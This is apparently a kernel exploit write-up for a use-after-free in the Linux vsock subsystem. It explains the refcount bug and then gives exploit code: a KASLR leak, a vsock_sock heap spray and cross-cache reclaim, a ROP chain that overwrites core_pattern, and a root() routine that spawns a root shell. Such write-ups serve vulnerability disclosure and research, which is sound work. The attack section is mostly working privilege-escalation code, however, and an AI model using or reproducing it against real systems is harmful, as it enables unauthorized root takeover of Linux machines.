# Vulnerability
This vulnerability occurs because the `vsock_remove_sock()` function called in the `vsock_connect()` flow calls `vsock_remove_bound()` and decrements the vsk’s reference count even though the vsk is not bound [1].

```c
void vsock_remove_sock(struct vsock_sock *vsk)
{
        vsock_remove_bound(vsk);    // [1]
        vsock_remove_connected(vsk);
}
EXPORT_SYMBOL_GPL(vsock_remove_sock);
```

The procedure to trigger the UAF is as follows. First, create a vsock, then call bind() and use getsockname() to obtain the addr information. `In the vsock_bind()` flow, when binding with `VMADDR_PORT_ANY`, a random `port` value is stored in a static variable and then used, so we need to read that `port` value from the addr information [2].

```c
static int __vsock_bind_connectible(struct vsock_sock *vsk,
                                    struct sockaddr_vm *addr)
{
        static u32 port;    // [2]
        struct sockaddr_vm new_addr;

        if (!port)
                port = get_random_u32_above(LAST_RESERVED_PORT);

        vsock_addr_init(&new_addr, addr->svm_cid, addr->svm_port);

        if (addr->svm_port == VMADDR_PORT_ANY) {
                bool found = false;
                unsigned int i;

                for (i = 0; i < MAX_PORT_RETRIES; i++) {    // [3]
                        if (port <= LAST_RESERVED_PORT)
                                port = LAST_RESERVED_PORT + 1;

                        new_addr.svm_port = port++;

                        if (!__vsock_find_bound_socket(&new_addr)) {
                                found = true;
                                break;
                        }
                }

                if (!found)
                        return -EADDRNOTAVAIL;    // [4]
        } else {
```

Next, starting from the retrieved `port` value, create and bind vsocks up to `MAX_PORT_RETRIES`. In `__vsock_bind_connectible()`, it loops `MAX_PORT_RETRIES` times from the given port to search for an available port number [3], and if none is found, it returns `-EADDRNOTAVAIL` [4]. In other words, this `bind()` operation is intended to force `__vsock_bind_connectible()` to return an error on a subsequent call.

Now, when `connect()` is called, `__vsock_bind_connectible()` is invoked in the following flow:

```c
vsock_connect()
  => vsock_auto_bind()
    => __vsock_bind()
      => __vsock_bind_connectible()
```

In the auto-bind flow of `vsock_connect()`, the function `__vsock_bind_connectible()` is called with the argument `VMADDR_PORT_ANY`, causing it to attempt to bind based on the `port` value[2]. However, because in the previous step we already created and bound vsocks starting from that `port` value for `MAX_PORT_RETRIES`, it fails to find an available `port` and returns an error [4].

Next, the `svm_cid` value is changed and `connect()` is attempted again. This triggers the vulnerable `vsock_remove_sock()` function in the flow that releases the existing transport[5].

```c
vsock_connect()
  => vsock_assign_transport()
    => virtio_transport_release()
      => virtio_transport_remove_sock()
        => vsock_remove_sock()    // [5]
          => vsock_remove_bound()
            => __vsock_remove_bound()
              => sock_put(&vsk->sk)
```

Because the bind() failed in the previous step [4], the socket should not be removed from the bound table, but without any check it calls `__vsock_remove_bound()`, decrementing the vsk’s refcnt by 1 [6]. As a result, the vsk’s refcnt is now 1.

```c
static void __vsock_remove_bound(struct vsock_sock *vsk)
{
        list_del_init(&vsk->bound_table);
        sock_put(&vsk->sk);    // [6]
}
```

Finally, calling `bind(VMADDR_PORT_ANY)` triggers the `__vsock_bind_connectible()` function. This function calls `__vsock_remove_bound()` at the end, decrementing the vsk’s refcnt by 1. As a result of that function call, the refcnt reaches 0 and the vsk is freed [7].

```c
static int __vsock_bind_connectible(struct vsock_sock *vsk,
                                    struct sockaddr_vm *addr)
{
        ...

        /* Remove connection oriented sockets from the unbound list and add them
         * to the hash table for easy lookup by its address.  The unbound list
         * is simply an extra entry at the end of the hash table, a trick used
         * by AF_UNIX.
         */
        __vsock_remove_bound(vsk);    // [7]
        __vsock_insert_bound(vsock_bound_sockets(&vsk->local_addr), vsk);

        return 0;
```

Then it calls `__vsock_insert_bound()`, which references the already freed vsk and thus triggers a Use-After-Free.

# Exploit Tech

## KASLR Leak: **Prefetch Attack**
It leaks the kernel base address using a side-channel known as EntryBleed (https://www.willsroot.io/2022/12/entrybleed.html).

## RIP Control
When the vulnerability is triggered, the freed `struct vsock_sock` is inserted into the `vsock_bind_table[]`.

```c
#define vsock_bound_sockets(addr) (&vsock_bind_table[VSOCK_HASH(addr)])

static void __vsock_insert_bound(struct list_head *list,    // vsock_bind_table[]
                                 struct vsock_sock *vsk)
{
        sock_hold(&vsk->sk);
        list_add(&vsk->bound_table, list);
}
```

Next, after creating a separate vsock and calling `connect()`, the `vsock_loopback_work()` worker is invoked in the following call stack to handle the `VIRTIO_VSOCK_OP_REQUEST` request.

```c
connect()
  vsock_connect()
    virtio_transport_connect()
      virtio_transport_connect()
        virtio_transport_send_pkt_info()
          vsock_loopback_send_pkt(VIRTIO_VSOCK_OP_REQUEST)
            queue_work(vsock_loopback_work)

[ kworker ]
vsock_loopback_work()
  virtio_transport_recv_pkt(VIRTIO_VSOCK_OP_REQUEST)
    vsock_find_bound_socket()
      __vsock_find_bound_socket()
```

In this worker, `__vsock_find_bound_socket()` is called to traverse the `vsock_bind_table` and retrieve the vsock that matches the criteria.

```c
static struct sock *__vsock_find_bound_socket(struct sockaddr_vm *addr)
{
        struct vsock_sock *vsk;

        list_for_each_entry(vsk, vsock_bound_sockets(addr), bound_table) {
                if (vsock_addr_equals_addr(addr, &vsk->local_addr))
                        return sk_vsock(vsk);

                if (addr->svm_port == vsk->local_addr.svm_port &&
                    (vsk->local_addr.svm_cid == VMADDR_CID_ANY ||
                     addr->svm_cid == VMADDR_CID_ANY))
                        return sk_vsock(vsk);
        }

        return NULL;
}
```

By heap spraying to set the UAF‐victim vsock’s `->local_addr` member to `{ .svm_cid = VMADDR_CID_LOCAL, .svm_port = VMADDR_PORT_ANY }`, and then passing the same `{ .svm_cid = VMADDR_CID_LOCAL, .svm_port = VMADDR_PORT_ANY }` as the argument to `connect()` on a separate vsock, the second conditional is satisfied and the victim vsock is returned. Afterwards, at the call to `sk->sk_write_space(sk);` inside `virtio_transport_recv_pkt()`, you can execute code at an arbitrary kernel address, thereby obtaining a RIP control primitive.

```c
void virtio_transport_recv_pkt(struct virtio_transport *t,
                               struct sk_buff *skb)
{
        struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
        struct sockaddr_vm src, dst;
        struct vsock_sock *vsk;
        struct sock *sk;
        bool space_available;
        
        ...
        
        sk = vsock_find_connected_socket(&src, &dst);
        if (!sk) {
                sk = vsock_find_bound_socket(&dst);    // victim vsock
                if (!sk) {
                        (void)virtio_transport_reset_no_sock(t, skb);
                        goto free_pkt;
                }
        }
        
        ...

        if (space_available)
                sk->sk_write_space(sk);    // rip control
```

## Spraying the ROP payload using Cross-Cache

First, perform a cross-cache operation to move the victim vsock from the `AF_VSOCK` slab cache into the buddy allocator.

```c
        for (int i=0; i<FRONT_SLUB_CNT; i++)
                for(int j=0; j<OBJS_PER_SLAB; j++)
                        sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

        target1 = spray_cnt;

        for (int i=0; i<OBJS_PER_SLAB; i++)
                sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

        vsock = socket(AF_VSOCK, SOCK_SEQPACKET, 0);    // victim vsock
        if (vsock < 0)
                die("socket");

        target2 = spray_cnt;
        for (int i = 0; i < OBJS_PER_SLAB; i++)
                sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

        back = spray_cnt;
        
        ...
        
        for (int i = 0; i < target1; i++)
                close(sprayed_vsock[i]);

        for (int i = target1; i < target2; i++)
                close(sprayed_vsock[i]);

        for (int i = target2; i < back; i++)
                close(sprayed_vsock[i]);
```

Then, we call `setxattr()` to reclaim the victim vsock into a `struct simple_xattr`.

```c
        for (int i = 0; i < 0x3000; i++) {
#define ATTRIBUTE_NAME_LEN 0x20
                snprintf(file_name, 0x100, "/tmp/xattrs%d", i);
                create_xattr(file_name, attribute_name, spray, XATTR_VALUE_KMALLOC_CG_16K, true);
        }
```

The ROP payload used at this point is as follows:

```c
        char core_pattern_buf[0x100] = "|/proc/%P/fd/666 %P";
        uint64_t *rops = spray_chunk.sk.dummy;
        int t = 0;
        rops[t++] = prdi_rsi_rdx_rcx;
        rops[t++] = 0;
        rops[t++] = 0x0a0000;// 0x12 must be 10(TCP_LISTEN)
        rops[t++] = 0;
        rops[t++] = 0;
        rops[t++] = prdi_rsi_rdx_rcx;
        rops[t++] = core_pattern;
        rops[t++] = (uint64_t)core_pattern_buf;
        rops[t++] = strlen(core_pattern_buf);
        rops[t++] = 0;
        rops[t++] = copy_from_user;
        rops[t++] = msleep;
        
        for(int i=0x500; i<0x4000; i+=0x500) {
                *((struct vsock_sock *)(spray + i)) = spray_chunk;
        }
```

## Achieve root privileges using core_pattern

Because we achieve RIP control in the worker context, we cannot return to user mode to spawn a shell. Therefore, in our ROP payload we use `copy_from_user()` to overwrite `core_pattern` with `"|/proc/%P/fd/666 %P"`. We then register ourselves on file descriptor 666 via `memfd_create()` and trigger a crash.

```c
        if (!fork()) {
                cpu_affinity(1);
                while (1) {
                        if (check_core()) {
                                printf("core pattern changed!\n");
                                char buf[0x100] = {};
                                int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
                                read(core, buf, sizeof(buf));
                                write(1, buf, sizeof(buf));
                                if (!fork()) {
                                        int memfd = memfd_create("x", 0);
                                        sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
                                        dup2(memfd, 666);
                                        close(memfd);

                                        // trigger crash
                                        *(size_t *)0 = 0;

                                        while(1);
                                }
                                return 0;
                        }
                }
        }
```

Now a core dump occurs, and executing `root()` grants a root shell.

```c
void root(char *buf)
{
        int pid = strtoull(buf, 0, 10);
        char path[0x100];
        printf("run root()\n");
        // fix stdin, stdout, stderr
        sprintf(path, "/proc/%d/ns/net", pid);
        int pfd = syscall(SYS_pidfd_open, pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        // just cat the flag
        system("/bin/sh");
}

int main(int argc, void *argv[])
{
        if (argc > 1) {
                printf("triggered from core_pattern\n");
                root(argv[1]);
                exit(0);
        }
```
